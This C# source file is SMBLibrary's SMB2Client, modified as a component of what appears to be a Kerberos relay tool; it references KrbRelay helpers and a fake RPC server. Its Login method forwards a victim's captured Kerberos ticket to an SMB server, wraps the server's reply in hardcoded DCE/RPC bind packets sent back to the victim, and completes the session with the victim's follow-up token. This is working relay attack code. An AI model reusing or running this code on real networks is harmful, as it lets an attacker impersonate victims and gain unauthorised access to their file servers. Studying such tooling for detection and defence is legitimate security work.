/* Copyright (C) 2017-2021 Tal Aloni <tal.aloni.il@gmail.com>. All rights reserved.
 *
 * You can redistribute this program and/or modify it under the terms of
 * the GNU Lesser Public License as published by the Free Software Foundation,
 * either version 3 of the License, or (at your option) any later version.
 */

using KrbRelay;
using MimeKit;
using Org.BouncyCastle.Asn1.Misc;
using SMBLibrary.NetBios;
using SMBLibrary.Services;
using SMBLibrary.SMB2;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Utilities;

namespace SMBLibrary.Client
{
    public class SMB2Client : ISMBClient
    {
        public static readonly int NetBiosOverTCPPort = 139;
        public static readonly int DirectTCPPort = 445;

        public static readonly uint ClientMaxTransactSize = 1048576;
        public static readonly uint ClientMaxReadSize = 1048576;
        public static readonly uint ClientMaxWriteSize = 1048576;
        private static readonly ushort DesiredCredits = 16;
        public static readonly int ResponseTimeoutInMilliseconds = 5000;

        private string m_serverName;
        private SMBTransportType m_transport;
        private bool m_isConnected;
        private bool m_isLoggedIn;
        private Socket m_clientSocket;
        public Socket currSourceSocket;
        public Socket currDestSocket;
        public FakeRPCServer currSocketServer;
        public string ServerType = "";
        public byte[] CallID = new byte[4];
        public byte[] AssocGroup= new byte[4];
        private object m_incomingQueueLock = new object();
        private List<SMB2Command> m_incomingQueue = new List<SMB2Command>();
        private EventWaitHandle m_incomingQueueEventHandle = new EventWaitHandle(false, EventResetMode.AutoReset);

        private SessionPacket m_sessionResponsePacket;
        private EventWaitHandle m_sessionResponseEventHandle = new EventWaitHandle(false, EventResetMode.AutoReset);

        private uint m_messageID = 0;
        private SMB2Dialect m_dialect;
        private bool m_signingRequired;
        public byte[] m_signingKey;
        private bool m_encryptSessionData;
        private byte[] m_encryptionKey;
        private byte[] m_decryptionKey;
        private uint m_maxTransactSize;
        private uint m_maxReadSize;
        private uint m_maxWriteSize;
        private ulong m_sessionID;
        private byte[] m_securityBlob;
        public byte[] m_sessionKey;
        private ushort m_availableCredits = 1;

        public SMB2Client()
        {
        }

        /// <param name="serverName">
        /// When a Windows Server host is using Failover Cluster and Cluster Shared Volumes, each of those CSV file shares is associated
        /// with a specific host name associated with the cluster and is not accessible using the node IP address or node host name.
        /// </param>
        public bool Connect(string serverName, SMBTransportType transport)
        {

            m_serverName = serverName;
            int port = (transport == SMBTransportType.DirectTCPTransport ? DirectTCPPort : NetBiosOverTCPPort);
            return Connect(serverName, transport, port);
        }

        public bool Connect(IPAddress serverAddress, SMBTransportType transport)
        {
            int port = (transport == SMBTransportType.DirectTCPTransport ? DirectTCPPort : NetBiosOverTCPPort);
            return Connect("", transport, port);
        }

        private bool Connect(string serverAddress, SMBTransportType transport, int port)
        {
            if (m_serverName == null)
            {
                m_serverName = serverAddress.ToString();
            }

            m_transport = transport;
            if (!m_isConnected)
            {
                if (!ConnectSocket(serverAddress, port))
                {
                    //Console.WriteLine("ConnectSock: {0} {1}",serverAddress,port);
                    return false;
                }

                if (transport == SMBTransportType.NetBiosOverTCP)
                {
                    SessionRequestPacket sessionRequest = new SessionRequestPacket();
                    sessionRequest.CalledName = NetBiosUtils.GetMSNetBiosName("*SMBSERVER", NetBiosSuffix.FileServiceService);
                    sessionRequest.CallingName = NetBiosUtils.GetMSNetBiosName(Environment.MachineName, NetBiosSuffix.WorkstationService);
                    TrySendPacket(m_clientSocket, sessionRequest);

                    SessionPacket sessionResponsePacket = WaitForSessionResponsePacket();
                    if (!(sessionResponsePacket is PositiveSessionResponsePacket))
                    {
                        m_clientSocket.Disconnect(false);
                        if (!ConnectSocket(serverAddress, port))
                        {
                            return false;
                        }

                        NameServiceClient nameServiceClient = new NameServiceClient(Dns.GetHostEntry(serverAddress).AddressList[0]);
                        string serverName = nameServiceClient.GetServerName();
                        if (serverName == null)
                        {
                            return false;
                        }

                        sessionRequest.CalledName = serverName;
                        TrySendPacket(m_clientSocket, sessionRequest);

                        sessionResponsePacket = WaitForSessionResponsePacket();
                        if (!(sessionResponsePacket is PositiveSessionResponsePacket))
                        {
                            return false;
                        }
                    }
                }

                bool supportsDialect = NegotiateDialect();
                if (!supportsDialect)
                {
                    //Console.WriteLine("ConnectSock: {0} {1}", supportsDialect, port);

                    m_clientSocket.Close();
                }
                else
                {
                    m_isConnected = true;
                }
            }
            //Console.WriteLine("ConnectSock: {0}", m_isConnected);
            return m_isConnected;
        }

        private bool ConnectSocket(IPAddress serverAddress, int port)
        {
            m_clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                m_clientSocket.Connect(serverAddress, port);
            }
            catch (SocketException)
            {
                return false;
            }

            ConnectionState state = new ConnectionState(m_clientSocket);
            NBTConnectionReceiveBuffer buffer = state.ReceiveBuffer;
            m_clientSocket.BeginReceive(buffer.Buffer, buffer.WriteOffset, buffer.AvailableLength, SocketFlags.None, new AsyncCallback(OnClientSocketReceive), state);
            return true;
        }

        private bool ConnectSocket(string serverAddress, int port)
        {
            m_clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

            try
            {
                m_clientSocket.Connect(serverAddress, port);
            }
            catch (SocketException ex)
            {
                Console.WriteLine("[!] Connect Sockket error: {0}", ex.Message);
                return false;
            }

            ConnectionState state = new ConnectionState(m_clientSocket);
            NBTConnectionReceiveBuffer buffer = state.ReceiveBuffer;
            m_clientSocket.BeginReceive(buffer.Buffer, buffer.WriteOffset, buffer.AvailableLength, SocketFlags.None, new AsyncCallback(OnClientSocketReceive), state);
            return true;
        }

        public void Disconnect()
        {
            if (m_isConnected)
            {
                m_clientSocket.Disconnect(false);
                m_isConnected = false;
            }
        }

        private bool NegotiateDialect()
        {
            NegotiateRequest request = new NegotiateRequest();
            request.SecurityMode = SecurityMode.SigningEnabled;
            request.Capabilities = Capabilities.Encryption;
            request.ClientGuid = Guid.NewGuid();
            request.ClientStartTime = DateTime.Now;
            request.Dialects.Add(SMB2Dialect.SMB202);
            request.Dialects.Add(SMB2Dialect.SMB210);
            request.Dialects.Add(SMB2Dialect.SMB300);

            TrySendCommand(request);
            NegotiateResponse response = WaitForCommand(request.MessageID) as NegotiateResponse;
            if (response != null && response.Header.Status == NTStatus.STATUS_SUCCESS)
            {
                m_dialect = response.DialectRevision;
                m_signingRequired = (response.SecurityMode & SecurityMode.SigningRequired) > 0;
                m_maxTransactSize = Math.Min(response.MaxTransactSize, ClientMaxTransactSize);
                m_maxReadSize = Math.Min(response.MaxReadSize, ClientMaxReadSize);
                m_maxWriteSize = Math.Min(response.MaxWriteSize, ClientMaxWriteSize);
                m_securityBlob = response.SecurityBuffer;
                return true;
            }
            return false;
        }

        //public NTStatus Login(string domainName, string userName, string password)
        //{
        //    return Login(domainName, userName, password, AuthenticationMethod.NTLMv2);
        //}

        public byte[] Login(byte[] ticket, out bool success)
        {
            success = false;
            if (!m_isConnected)
            {
                throw new InvalidOperationException("A connection must be successfully established before attempting login");
            }

            //send apReq
            SessionSetupRequest request = new SessionSetupRequest();
            //request.SecurityMode = 0x0000;
            request.SecurityMode = SecurityMode.SigningEnabled;

            request.SecurityBuffer = ticket;

            TrySendCommand(request);
            SMB2Command response = WaitForCommand(request.MessageID);

            //get apRep
            byte[] answer = response.GetBytes();
            int startoff = 72;

            int pattern = KrbRelay.Helpers.PatternAt(answer, new byte[] { 0xa1, 0x81 });
            //Console.WriteLine("pattern {0}", pattern);

            //byte[] newticket = new byte[answer.Length - pattern];
            //byte[] newticket = new byte[blobl];
            byte[] newticket = answer.Skip(startoff).ToArray();

            //byte [] newticket = new byte []{ 0xA1, 0x81, 0xA6, 0x30, 0x81, 0xA3, 0xA0, 0x03, 0x0A, 0x01, 0x01, 0xA1, 0x0B, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x82, 0xF7, 0x12, 0x01, 0x02, 0x02, 0xA2, 0x81, 0x8E, 0x04, 0x81, 0x8B, 0x6F, 0x81, 0x88, 0x30, 0x81, 0x85, 0xA0, 0x03, 0x02, 0x01, 0x05, 0xA1, 0x03, 0x02, 0x01, 0x0F, 0xA2, 0x79, 0x30, 0x77, 0xA0, 0x03, 0x02, 0x01, 0x12, 0xA2, 0x70, 0x04, 0x6E, 0x9A, 0xC3, 0x30, 0x4C, 0x25, 0xDF, 0x9F, 0x5D, 0x01, 0xD4, 0x01, 0x19, 0x32, 0x10, 0x16, 0xF1, 0x49, 0xA3, 0x10, 0xE9, 0x4D, 0xB3, 0x82, 0x01, 0xE4, 0x14, 0x09, 0x70, 0x01, 0x90, 0x60, 0x10, 0x7E, 0x63, 0xE9, 0x6F, 0xEB, 0x78, 0x13, 0xB2, 0x95, 0x0F, 0xD7, 0x25, 0x1B, 0x2D, 0xD5, 0x5E, 0xE8, 0x1C, 0xB2, 0xB4, 0x0C, 0x54, 0x40, 0x62, 0x92, 0x88, 0x3D, 0x59, 0xB2, 0x56, 0x3C, 0x6E, 0x57, 0x55, 0x1C, 0x53, 0x72, 0xCB, 0x10, 0x3C, 0xEF, 0xC8, 0xE9, 0x06, 0x18, 0x6D, 0xB8, 0x98, 0xAF, 0xAD, 0xDE, 0xFF, 0xB4, 0xD9, 0x35, 0xF3, 0xAE, 0xEC, 0x40, 0x00, 0xA8, 0xE2, 0x3C, 0x30, 0x97, 0xF0, 0x45, 0xDC, 0x6F, 0x29, 0xC4, 0xC6, 0x8E, 0x75, 0x7C, 0x09, 0x6C, 0xE8 };
            //Array.Copy(answer, pattern, newticket, 0, answer.Length - pattern);

            //Array.Copy(answer, pattern, newticket, 0, offset+startoff);



            if (response != null)
            {
                m_sessionID = response.Header.SessionID;

                if (response.Header.Status == NTStatus.STATUS_SUCCESS)
                {
                    m_isLoggedIn = (response.Header.Status == NTStatus.STATUS_SUCCESS);

                    if (m_isLoggedIn)
                    {
                        m_sessionKey = new byte[16];
                        new Random().NextBytes(m_sessionKey);
                        m_signingKey = SMB2Cryptography.GenerateSigningKey(m_sessionKey, m_dialect, null);
                        if (m_dialect == SMB2Dialect.SMB300)
                        {
                            m_encryptSessionData = (((SessionSetupResponse)response).SessionFlags & SessionFlags.EncryptData) > 0;
                            m_encryptionKey = SMB2Cryptography.GenerateClientEncryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
                            m_decryptionKey = SMB2Cryptography.GenerateClientDecryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
                        }
                    }
                    //Console.WriteLine("m_sessionKey--");
                    //Console.WriteLine(KrbRelay.Helpers.ByteArrayToString(m_sessionKey));

                    Program.forwdardmode = true;
                    currSocketServer.CloseConnection(currSocketServer.state);
                    currSocketServer.state.isRelayed = false;
                    success = true;
                    return ticket;
                }
                else if (response.Header.Status == NTStatus.STATUS_MORE_PROCESSING_REQUIRED)
                {

                    Console.WriteLine("[*] SmbClient [{0}] STATUS_MORE_PROCESSING_REQUIRED", currSocketServer.state.SourceSocket.RemoteEndPoint);
                    byte[] moreArray=null;
                    byte[] moreArray2;
                    byte[] moreArray1;
                    ulong sessid = response.Header.SessionID;
                    byte[] buffer = new byte[4096];
                    byte[] b = BitConverter.GetBytes(sessid);
                    /*
                    //int pattern = KrbRelay.Helpers.PatternAt(answer, new byte[] { 0x6f, 0x81 });

                    /*
                    using (FileStream fs = new FileStream("c:\\temp\\more2.bin", FileMode.Open, FileAccess.Read))
                    {
                        // Create a buffer to hold the file contents
                        moreArray = new byte[fs.Length];

                        // Read the file into the buffer
                        fs.Read(moreArray, 0, (int)fs.Length);
                    }*/
                    //Array.Copy(b, 0, moreArray, 44, 8);
                    SessionSetupRequest request1 = new SessionSetupRequest();
                    //request.SecurityMode = 0x0000;
                    //request1.SecurityMode = SecurityMode.SigningEnabled;

                    //request.SecurityMode = 0x0000;
                    request1.SecurityMode = SecurityMode.SigningEnabled;
                    request1.SecurityBuffer = ticket;
                    /*
                    using (FileStream fs = new FileStream("c:\\temp\\destination.bin", FileMode.Open, FileAccess.Read))
                    {
                        // Create a buffer to hold the file contents
                        moreArray = new byte[fs.Length];

                        // Read the file into the buffer
                        fs.Read(moreArray, 0, (int)fs.Length);
                    }*/
                    moreArray1 = new byte[] { 0x05, 0x00, 0x0c, 0x07, 0x10, 0x00, 0x00, 0x00, 0xEE, 0x00, 0xAA, 0x00, 0x03, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xF6, 0x15, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00 };
                    moreArray2 = new byte[] { 0x05, 0x00, 0x0C, 0x07, 0x10, 0x00, 0x00, 0x00, 0x05, 0x01, 0xA9, 0x00, 0x29, 0x00, 0x00, 0x00, 0xD0, 0x16, 0xD0, 0x16, 0xD1, 0x08, 0x00, 0x00, 0x04, 0x00, 0x31, 0x33, 0x35, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


                    
                    int outlen = 0;
                    //Console.WriteLine("[/] Offsets: {0} {1}", currSocketServer.IOXidResolverOffset, currSocketServer.ISystemActivatorOffset);
                    byte[] head;
                    if (currSocketServer.IOXidResolverOffset > 0)

                    {
                        //Console.WriteLine("[*] SmbClient STATUS_MORE_PROCESSING_REQUIRED  for OXID");
                        moreArray = new byte[moreArray2.Length];
                        Array.Copy(moreArray2, moreArray, moreArray2.Length);
                                              

                    }

                    else
                    {
                        
                        moreArray = new byte[moreArray1.Length];
                        Array.Copy(moreArray1, moreArray, moreArray1.Length);
                    }
                        head = new byte[] { 0x09, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };


                        outlen = newticket.Length + moreArray.Length + 8;
                        
                        byte[] outbuffer = new byte[outlen];
                        byte[] b1 = BitConverter.GetBytes(outlen);

                        Array.Copy(moreArray, 0, outbuffer, 0, moreArray.Length);
                        Array.Copy(head, 0, outbuffer, moreArray.Length, 8);
                        Array.Copy(newticket, 0, outbuffer, moreArray.Length + 8, newticket.Length);
                        Array.Copy(b1, 0, outbuffer, 8, 2);
                        b1 = BitConverter.GetBytes(newticket.Length);

                        //Console.WriteLine("Nweticket len: {0}",(newticket.Length));
                        Array.Copy(b1, 0, outbuffer, 10, 2);
                        outbuffer[12] = Program.CallID[0];
                        outbuffer[12] = CallID[0];
                    //Console.WriteLine("written: {0}", outlen);
                    Array.Copy(Program.AssocGroup, 0, outbuffer, 20, 4);
                        //Console.WriteLine("[*] callid {0} Assocgroup {1}",Program.CallID[0], Convert.ToHexString(Program.AssocGroup));
                        //Console.WriteLine(Program.HexDump(Program.AssocGroup, 16, 4));
                        //Console.WriteLine(Program.HexDump(outbuffer,16,24));
                        //Console.WriteLine(Program.HexDump(outbuffer, 16, 24));
                        //Console.WriteLine("[/] SmbClient sending to client");
                        //Console.WriteLine(Program.HexDump(outbuffer, 16));
                        currSourceSocket.Send(outbuffer, 0);
                        
                    
                   // Console.WriteLine("[/] SmbClient  receiving from client");
                    int l = currSourceSocket.Receive(buffer);                    //Console.WriteLine("rec 2 {0}",l);
                   
                    //Console.WriteLine("rec 2 {0}",l);
                    //Console.WriteLine(Program.HexDump(buffer,16,l));
                    pattern = KrbRelay.Helpers.PatternAt(buffer, new byte[] { 0xa1, 0x81 });
                  /*  if (pattern < 0)
                        return null;*/

                    int l3 = l - pattern;
                    
                    byte[] sendbuffer = new byte[l3];
                    Array.Copy(buffer, pattern, sendbuffer, 0, l3);
                    request1.SecurityBuffer = sendbuffer;
                    //Console.WriteLine("[/] SmbClient  sending to SMB server");
                    TrySendCommand(request1);
                    //Console.WriteLine("waiting for: {0}", request1.MessageID);
                    //Console.WriteLine("[/] SmbClient  waiting from SMB server");
                    SMB2Command response1 = WaitForCommand(request1.MessageID);
                    //Console.WriteLine("done sending 2");

                    /*
                    byte[] moreArray;
                    ulong sessid = response.Header.SessionID;
                    byte[] b =  BitConverter.GetBytes(sessid);

                    
                    Array.Copy(b, 0, moreArray, 44, 8);
                    TrySendPacketBytes(m_clientSocket, moreArray);
                    */
                    //Console.WriteLine("[*] SmbClient [{0}]  Header Status {1}", currSocketServer.state.SourceSocket.RemoteEndPoint, response1.Header.Status);
                    Console.WriteLine("[*] Header Status {0}", response1.Header.Status);
                    m_sessionID = response1.Header.SessionID;

                    if (response1.Header.Status == NTStatus.STATUS_SUCCESS)
                    {
                        m_isLoggedIn = (response1.Header.Status == NTStatus.STATUS_SUCCESS);

                        if (m_isLoggedIn)
                        {
                            m_sessionKey = new byte[16];
                            new Random().NextBytes(m_sessionKey);
                            m_signingKey = SMB2Cryptography.GenerateSigningKey(m_sessionKey, m_dialect, null);
                            if (m_dialect == SMB2Dialect.SMB300)
                            {
                                m_encryptSessionData = (((SessionSetupResponse)response).SessionFlags & SessionFlags.EncryptData) > 0;
                                m_encryptionKey = SMB2Cryptography.GenerateClientEncryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
                                m_decryptionKey = SMB2Cryptography.GenerateClientDecryptionKey(m_sessionKey, SMB2Dialect.SMB300, null);
                            }
                        }

                        success = true;
                    }
                    Program.forwdardmode = true;
                    //if(currSocketServer.ISystemActivatorOffset > -1 || currSocketServer.IOXidResolverOffset > -1)
                    { 
                    currSocketServer.CloseConnection(currSocketServer.state);
                    
                    }
                    
                    currSocketServer.state.isRelayed = false;
                    return sendbuffer;
                }
                else
                {
                    Console.WriteLine("[-] SmbClient [{0}]  Error: {1}", currSocketServer.state.SourceSocket.RemoteEndPoint,response.Header.Status);
                    //throw new Win32Exception((int)response.Header.Status);
                }
            }

            currSocketServer.state.isRelayed = false;
            //Program.forwdardmode = true;
            //if(currSocketServer.EPMOffset ==-1)
              //  currSocketServer.CloseConnection(currSocketServer.state);
            
            return ticket;
        }
        

        public NTStatus Logoff()
        {
            if (!m_isConnected)
            {
                throw new InvalidOperationException("A login session must be successfully established before attempting logoff");
            }

            LogoffRequest request = new LogoffRequest();
            TrySendCommand(request);

            SMB2Command response = WaitForCommand(request.MessageID);
            if (response != null)
            {
                m_isLoggedIn = (response.Header.Status != NTStatus.STATUS_SUCCESS);
                return response.Header.Status;
            }
            return NTStatus.STATUS_INVALID_SMB;
        }

        public List<ShareInfo2Entry> ListShares(out NTStatus status)
        {
            if (!m_isConnected || !m_isLoggedIn)
            {
                throw new InvalidOperationException("A login session must be successfully established before retrieving share list");
            }

            ISMBFileStore namedPipeShare = TreeConnect("IPC$", out status);
            if (namedPipeShare == null)
            {
                return null;
            }

            List<ShareInfo2Entry> shares = ServerServiceHelper.ListShares(namedPipeShare, m_serverName, SMBLibrary.Services.ShareType.DiskDrive, out status);
            namedPipeShare.Disconnect();
            return shares;
        }

        public ISMBFileStore TreeConnect(string shareName, out NTStatus status)
        {
            if (!m_isConnected || !m_isLoggedIn)
            {
                throw new InvalidOperationException("A login session must be successfully established before connecting to a share");
            }

            string sharePath = String.Format(@"\\{0}\{1}", m_serverName, shareName);
            TreeConnectRequest request = new TreeConnectRequest();
            request.Path = sharePath;
            TrySendCommand(request);
            SMB2Command response = WaitForCommand(request.MessageID);
            if (response != null)
            {
                status = response.Header.Status;
                if (response.Header.Status == NTStatus.STATUS_SUCCESS && response is TreeConnectResponse)
                {
                    bool encryptShareData = (((TreeConnectResponse)response).ShareFlags & ShareFlags.EncryptData) > 0;
                    return new SMB2FileStore(this, response.Header.TreeID, m_encryptSessionData || encryptShareData);
                }
            }
            else
            {
                status = NTStatus.STATUS_INVALID_SMB;
            }
            return null;
        }

        private void OnClientSocketReceive(IAsyncResult ar)
        {
            ConnectionState state = (ConnectionState)ar.AsyncState;
            Socket clientSocket = state.ClientSocket;

            if (!clientSocket.Connected)
            {
                return;
            }

            int numberOfBytesReceived = 0;
            try
            {
                numberOfBytesReceived = clientSocket.EndReceive(ar);
            }
            catch (ArgumentException) // The IAsyncResult object was not returned from the corresponding synchronous method on this class.
            {
                return;
            }
            catch (ObjectDisposedException)
            {
                Log("[ReceiveCallback] EndReceive ObjectDisposedException");
                return;
            }
            catch (SocketException ex)
            {
                Log("[ReceiveCallback] EndReceive SocketException: " + ex.Message);
                return;
            }

            if (numberOfBytesReceived == 0)
            {
                m_isConnected = false;
            }
            else
            {
                NBTConnectionReceiveBuffer buffer = state.ReceiveBuffer;
                buffer.SetNumberOfBytesReceived(numberOfBytesReceived);
                ProcessConnectionBuffer(state);

                try
                {
                    clientSocket.BeginReceive(buffer.Buffer, buffer.WriteOffset, buffer.AvailableLength, SocketFlags.None, new AsyncCallback(OnClientSocketReceive), state);
                }
                catch (ObjectDisposedException)
                {
                    m_isConnected = false;
                    Log("[ReceiveCallback] BeginReceive ObjectDisposedException");
                }
                catch (SocketException ex)
                {
                    m_isConnected = false;
                    Log("[ReceiveCallback] BeginReceive SocketException: " + ex.Message);
                }
            }
        }

        private void ProcessConnectionBuffer(ConnectionState state)
        {
            NBTConnectionReceiveBuffer receiveBuffer = state.ReceiveBuffer;
            while (receiveBuffer.HasCompletePacket())
            {
                SessionPacket packet = null;
                try
                {
                    packet = receiveBuffer.DequeuePacket();
                }
                catch (Exception)
                {
                    state.ClientSocket.Close();
                    break;
                }

                if (packet != null)
                {
                    ProcessPacket(packet, state);
                }
            }
        }

        private void ProcessPacket(SessionPacket packet, ConnectionState state)
        {
            if (packet is SessionMessagePacket)
            {
                byte[] messageBytes;
                if (m_dialect == SMB2Dialect.SMB300 && SMB2TransformHeader.IsTransformHeader(packet.Trailer, 0))
                {
                    SMB2TransformHeader transformHeader = new SMB2TransformHeader(packet.Trailer, 0);
                    byte[] encryptedMessage = ByteReader.ReadBytes(packet.Trailer, SMB2TransformHeader.Length, (int)transformHeader.OriginalMessageSize);
                    messageBytes = SMB2Cryptography.DecryptMessage(m_decryptionKey, transformHeader, encryptedMessage);
                }
                else
                {
                    messageBytes = packet.Trailer;
                }

                SMB2Command command;
                try
                {
                    command = SMB2Command.ReadResponse(messageBytes, 0);
                }
                catch (Exception ex)
                {
                    Log("Invalid SMB2 response: " + ex.Message);
                    state.ClientSocket.Close();
                    m_isConnected = false;
                    return;
                }

                m_availableCredits += command.Header.Credits;

                if (m_transport == SMBTransportType.DirectTCPTransport && command is NegotiateResponse)
                {
                    NegotiateResponse negotiateResponse = (NegotiateResponse)command;
                    if ((negotiateResponse.Capabilities & Capabilities.LargeMTU) > 0)
                    {
                        // [MS-SMB2] 3.2.5.1 Receiving Any Message - If the message size received exceeds Connection.MaxTransactSize, the client MUST disconnect the connection.
                        // Note: Windows clients do not enforce the MaxTransactSize value, we add 256 bytes.
                        int maxPacketSize = SessionPacket.HeaderLength + (int)Math.Min(negotiateResponse.MaxTransactSize, ClientMaxTransactSize) + 256;
                        if (maxPacketSize > state.ReceiveBuffer.Buffer.Length)
                        {
                            state.ReceiveBuffer.IncreaseBufferSize(maxPacketSize);
                        }
                    }
                }

                // [MS-SMB2] 3.2.5.1.2 - If the MessageId is 0xFFFFFFFFFFFFFFFF, this is not a reply to a previous request,
                // and the client MUST NOT attempt to locate the request, but instead process it as follows:
                // If the command field in the SMB2 header is SMB2 OPLOCK_BREAK, it MUST be processed as specified in 3.2.5.19.
                // Otherwise, the response MUST be discarded as invalid.
                if (command.Header.MessageID != 0xFFFFFFFFFFFFFFFF || command.Header.Command == SMB2CommandName.OplockBreak)
                {
                    lock (m_incomingQueueLock)
                    {
                        m_incomingQueue.Add(command);
                        m_incomingQueueEventHandle.Set();
                    }
                }
            }
            else if ((packet is PositiveSessionResponsePacket || packet is NegativeSessionResponsePacket) && m_transport == SMBTransportType.NetBiosOverTCP)
            {
                m_sessionResponsePacket = packet;
                m_sessionResponseEventHandle.Set();
            }
            else if (packet is SessionKeepAlivePacket && m_transport == SMBTransportType.NetBiosOverTCP)
            {
                // [RFC 1001] NetBIOS session keep alives do not require a response from the NetBIOS peer
            }
            else
            {
                Log("Inappropriate NetBIOS session packet");
                state.ClientSocket.Close();
            }
        }

        internal SMB2Command WaitForCommand(ulong messageID)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (stopwatch.ElapsedMilliseconds < ResponseTimeoutInMilliseconds)
            {
                lock (m_incomingQueueLock)
                {
                    for (int index = 0; index < m_incomingQueue.Count; index++)
                    {
                        SMB2Command command = m_incomingQueue[index];

                        if (command.Header.MessageID == messageID)
                        {
                            m_incomingQueue.RemoveAt(index);
                            if (command.Header.IsAsync && command.Header.Status == NTStatus.STATUS_PENDING)
                            {
                                index--;
                                continue;
                            }
                            return command;
                        }
                    }
                }
                m_incomingQueueEventHandle.WaitOne(100);
            }
            return null;
        }

        internal SessionPacket WaitForSessionResponsePacket()
        {
            const int TimeOut = 5000;
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (stopwatch.ElapsedMilliseconds < TimeOut)
            {
                if (m_sessionResponsePacket != null)
                {
                    SessionPacket result = m_sessionResponsePacket;
                    m_sessionResponsePacket = null;
                    return result;
                }

                m_sessionResponseEventHandle.WaitOne(100);
            }

            return null;
        }

        private void Log(string message)
        {
            System.Diagnostics.Debug.Print(message);
        }

        internal void TrySendCommand(SMB2Command request)
        {
            TrySendCommand(request, m_encryptSessionData);
        }

        internal void TrySendCommand(SMB2Command request, bool encryptData)
        {
            if (m_dialect == SMB2Dialect.SMB202 || m_transport == SMBTransportType.NetBiosOverTCP)
            {
                request.Header.CreditCharge = 0;
                request.Header.Credits = 1;
                m_availableCredits -= 1;
            }
            else
            {
                if (request.Header.CreditCharge == 0)
                {
                    request.Header.CreditCharge = 1;
                }

                if (m_availableCredits < request.Header.CreditCharge)
                {
                    throw new Exception("Not enough credits");
                }

                m_availableCredits -= request.Header.CreditCharge;

                if (m_availableCredits < DesiredCredits)
                {
                    request.Header.Credits += (ushort)(DesiredCredits - m_availableCredits);
                }
            }

            request.Header.MessageID = m_messageID;
            request.Header.SessionID = m_sessionID;
            // [MS-SMB2] If the client encrypts the message [..] then the client MUST set the Signature field of the SMB2 header to zero
            if (m_signingRequired && !encryptData)
            {
                request.Header.IsSigned = (m_sessionID != 0 && ((request.CommandName == SMB2CommandName.TreeConnect || request.Header.TreeID != 0) ||
                                                                (m_dialect == SMB2Dialect.SMB300 && request.CommandName == SMB2CommandName.Logoff)));
                if (request.Header.IsSigned)
                {
                    request.Header.Signature = new byte[16]; // Request could be reused
                    byte[] buffer = request.GetBytes();
                    byte[] signature = SMB2Cryptography.CalculateSignature(m_signingKey, m_dialect, buffer, 0, buffer.Length);
                    // [MS-SMB2] The first 16 bytes of the hash MUST be copied into the 16-byte signature field of the SMB2 Header.
                    request.Header.Signature = ByteReader.ReadBytes(signature, 0, 16);
                }
            }
            TrySendCommand(m_clientSocket, request, encryptData ? m_encryptionKey : null);
            if (m_dialect == SMB2Dialect.SMB202 || m_transport == SMBTransportType.NetBiosOverTCP)
            {
                m_messageID++;
            }
            else
            {
                m_messageID += request.Header.CreditCharge;
            }
        }

        public uint MaxTransactSize
        {
            get
            {
                return m_maxTransactSize;
            }
        }

        public uint MaxReadSize
        {
            get
            {
                return m_maxReadSize;
            }
        }

        public uint MaxWriteSize
        {
            get
            {
                return m_maxWriteSize;
            }
        }

        public static void TrySendCommand(Socket socket, SMB2Command request, byte[] encryptionKey)
        {
            SessionMessagePacket packet = new SessionMessagePacket();
            if (encryptionKey != null)
            {
                byte[] requestBytes = request.GetBytes();
                packet.Trailer = SMB2Cryptography.TransformMessage(encryptionKey, requestBytes, request.Header.SessionID);
            }
            else
            {
                packet.Trailer = request.GetBytes();
            }
            TrySendPacket(socket, packet);
        }

        public static void TrySendPacket(Socket socket, SessionPacket packet)
        {
            try
            {
                byte[] packetBytes = packet.GetBytes();
                socket.Send(packetBytes);
            }
            catch (SocketException)
            {
            }
            catch (ObjectDisposedException)
            {
            }
        }
        public static void TrySendPacketBytes(Socket socket, byte[] packet)
        {
            try
            {

                socket.Send(packet);
            }
            catch (SocketException)
            {
            }
            catch (ObjectDisposedException)
            {
            }
        }
    }
}